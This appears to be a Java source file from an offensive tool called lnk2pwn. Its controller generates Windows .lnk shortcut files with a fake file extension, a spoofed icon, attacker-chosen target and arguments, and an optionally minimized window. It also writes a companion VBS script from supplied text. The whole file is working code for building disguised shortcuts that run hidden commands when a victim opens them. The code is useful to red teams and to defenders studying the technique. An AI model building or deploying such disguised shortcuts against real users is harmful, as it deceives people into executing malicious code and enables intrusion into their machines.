package com.itgorillaz.lnk2pwn.controller;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

import javax.annotation.PostConstruct;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.stereotype.Component;

import com.github.vatbub.mslinks.ShellLink;
import com.github.vatbub.mslinks.ShellLinkException;
import com.github.vatbub.mslinks.ShellLinkHeader;
import com.itgorillaz.lnk2pwn.model.Shortcut;

@Component
public class ShortcutController {

    private static final Logger LOGGER = LogManager.getLogger(ShortcutController.class);
    
    private final String LINK_EXT = ".lnk";
    private final Map<String, Integer> WINDOW_STYLE_MAP = new HashMap<>();
    
    @PostConstruct
    private void initWindowStyleMap() {
        WINDOW_STYLE_MAP.put("MINIMIZED", ShellLinkHeader.SW_SHOWMINNOACTIVE);
        WINDOW_STYLE_MAP.put("MAXIMIZED", ShellLinkHeader.SW_SHOWMAXIMIZED);
        WINDOW_STYLE_MAP.put("NORMAL", ShellLinkHeader.SW_SHOWNORMAL);
    }
        
    public void generateShortcut(Shortcut shortcut) throws IOException, ShellLinkException {
        LOGGER.info("Generating a new shortcut(.lnk)");
        
        String fileName = String.valueOf(shortcut.getFileName());
        String fakeExtension = String.valueOf(shortcut.getFakeExtension());
        String workingDir = String.valueOf(shortcut.getWorkingDir());
        String targetPath = String.valueOf(shortcut.getTargetPath());
        String arguments = String.valueOf(shortcut.getArguments());
        String iconLocation = String.valueOf(shortcut.getIconLocation());
        String windowStyle = shortcut.getWindowStyle();
        Integer iconIndex = shortcut.getIconIndex();
        String vbsFileName = String.valueOf(shortcut.getVbsFileName());
        String commandOuput = String.valueOf(shortcut.getCommandOuput());
        String outputPath = String.valueOf(shortcut.getOutputPath());
        
        String linkName = String.valueOf(shortcut.getFileName())
                .concat(String.valueOf(shortcut.getFakeExtension()));
        
        LOGGER.info(String.format("File Name: %s", fileName));
        LOGGER.info(String.format("Fake Extension: %s", fakeExtension));
        LOGGER.info(String.format("Working Dir: %s", workingDir));
        LOGGER.info(String.format("Target Path: %s", targetPath));
        LOGGER.info(String.format("Arguments: %s", arguments));
        LOGGER.info(String.format("Icon Location: %s", iconLocation));
        LOGGER.info(String.format("Icon Index: %s", iconIndex));
        LOGGER.info(String.format("Window Style: %s", windowStyle));
        LOGGER.info(String.format("VBS File Name: %s", vbsFileName));		
        LOGGER.info(String.format("Link Name: %s", linkName));
        LOGGER.info(String.format("Output Path: %s", outputPath));
        LOGGER.info(String.format("Command Output:\n%s", commandOuput));
                
        ShellLink sl = ShellLink.createLink(linkName)
                .setWorkingDir(workingDir)				
                .setTarget(targetPath)
                .setCMDArgs(arguments)				
                .setIconLocation(iconLocation);
        
        sl.getHeader().setShowCommand(WINDOW_STYLE_MAP.get(shortcut.getWindowStyle()));
        
        if (!Objects.isNull(iconIndex)) {
            sl.getHeader().setIconIndex(iconIndex);
        }
                                        
        String linkOutput = outputPath
                .concat("/")
                .concat(linkName)
                .concat(LINK_EXT);
                        
        String vbsOutput = outputPath
                .concat("/")
                .concat(vbsFileName);
        
        Files.write(Paths.get(vbsOutput), commandOuput.getBytes());		
        sl.saveTo(linkOutput);
        
        LOGGER.info("Shortcut successfully generated!");
    }
    
}
